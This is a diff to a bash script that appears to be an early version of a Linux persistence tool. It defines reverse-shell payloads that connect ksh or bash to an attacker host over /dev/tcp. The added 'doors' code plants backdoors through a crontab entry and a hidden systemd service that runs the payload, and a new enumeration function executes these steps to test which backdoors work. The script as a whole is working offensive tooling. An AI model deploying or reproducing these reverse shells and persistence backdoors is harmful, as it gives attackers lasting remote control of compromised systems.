@@ -5,9 +5,15 @@
 methods=(
 	"ksh,if ksh -c 'exit',ksh -c 'ksh -i > /dev/tcp/$attackBox/$attackPort 2>&1 0>&1':"
 	"bash,if bash -c 'exit',bash -c 'bash -i > /dev/tcp/$attackBox/$attackPort 2>&1 0>&1':"
-	)
+)
 
-enum() {
+doors=(
+	"crontab,if crontab -l > /dev/shm/.cron; echo \"* * * * * echo linper\" >> /dev/shm/.cron; crontab /dev/shm/.cron; crontab -l > /dev/shm/.cron | grep linper,echo \"$cron $payload\":" 
+	"systemctl,if touch /etc/systemd/.temp,export temp_service=.$(mktemp -u | sed 's/.*\.//g').service; touch /etc/systemd/system/$temp_service; echo \"[Service]\" >> /etc/systemd/system/$temp_service; echo \"Type=oneshot\" >> /etc/systemd/system/$temp_service; echo \"ExecStartPre=$(which sleep) 60 \" >> /etc/systemd/system/$temp_service; echo \"ExecStart=$(which $SHELL) -c '$payload' \" >> /etc/systemd/system/$temp_service; echo \"[Install]\" >> /etc/systemd/system/$temp_service; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/$temp_service; chmod 644 /etc/systemd/system/$temp_service; systemctl start $temp_service 2> /dev/null & sleep .0001; systemctl enable $temp_service 2> /dev/null & sleep .0001; echo $temp_service:"
+)
+
+#return method and payload of available
+enum_methods() {
 	echo "Enuming methods avaliable"
 	IFS=":"
 	for s in ${methods[@]};
@@ -21,7 +27,7 @@ enum() {
 			#echo "eval staement = " $eval_statement
 			#echo "payload = " $payload
 			#echo
-			echo "$eval_statement" | $SHELL 2> /dev/null
+			echo "$eval_statement"; echo "$eval_statement" | $SHELL 2> /dev/null
 			if [ $? -eq 0 ];
 			then
 				echo -e "\e[92m[+]\e[0m $method"
@@ -30,7 +36,36 @@ enum() {
 	done
 }
 
-enum
+# enumerate where all backdoors can be placed
+enum_doors() {
+	echo "Enuming doors avaliable"
+	IFS=":"
+	for s in ${doors[@]};
+	do
+		door=$(echo $s | awk -F ',' '{print $1}')
+		echo "door = " $door
+		eval_statement=$(echo $s | awk -F ',' '{print $2}' | sed 's/^...//g')
+		echo "eval = " $eval_statement
+		hinge=$(echo $s | awk -F ',' '{print $3}')
+		echo "hinge = " $hinge
+		echo "----------------------------"
+		if $(echo $method | grep -qi "[a-z]")
+		then
+			#echo "method = " $method
+			#echo "eval staement = " $eval_statement
+			#echo "payload = " $payload
+			#echo
+			echo "$eval_statement"; echo "$eval_statement" | $SHELL 2> /dev/null
+			if [ $? -eq 0 ];
+			then
+				echo -e "\e[92m[+]\e[0m $door"
+			fi
+		fi
+	done
+}
+
+
+enum_doors
 
 #attackBox=0.0.0.0
 #attackPort=5253
